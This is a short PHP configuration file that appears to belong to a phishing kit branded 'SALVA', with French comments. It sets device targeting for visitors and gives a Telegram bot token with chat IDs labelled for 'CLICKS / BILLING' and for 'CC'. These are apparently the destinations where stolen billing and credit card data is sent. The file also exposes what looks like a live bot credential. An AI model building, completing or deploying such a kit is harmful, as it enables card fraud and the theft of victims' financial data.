<?php

// Prevent direct access
if (basename($_SERVER['SCRIPT_FILENAME']) === basename(__FILE__)) {
    header('HTTP/1.1 403 Forbidden');
    exit();
}

//   _____         _ __      __     
//  / ____|  /\   | |\ \    / /\    
// | (___   /  \  | | \ \  / /  \   
//  \___ \ / /\ \ | |  \ \/ / /\ \  
//  ____) / ____ \| |___\  / ____ \ 
// |_____/_/    \_\______\/_/    \_\

// ONLY MOBILE : true = uniquement mobile, false = uniquement PC, null = tout le monde
$only_mobile = null;

// CLICKS / BILLING
$bot_token = '8620621747:AAE6OarNMHXUcMu_oHXAusgsLvF2aoNX8c8';
$chat_id = '-5019627047';

// CC
$botToken = '8620621747:AAE6OarNMHXUcMu_oHXAusgsLvF2aoNX8c8'; 
$chatId = '-5135604579'; // ID Distinct pour les CC 

?>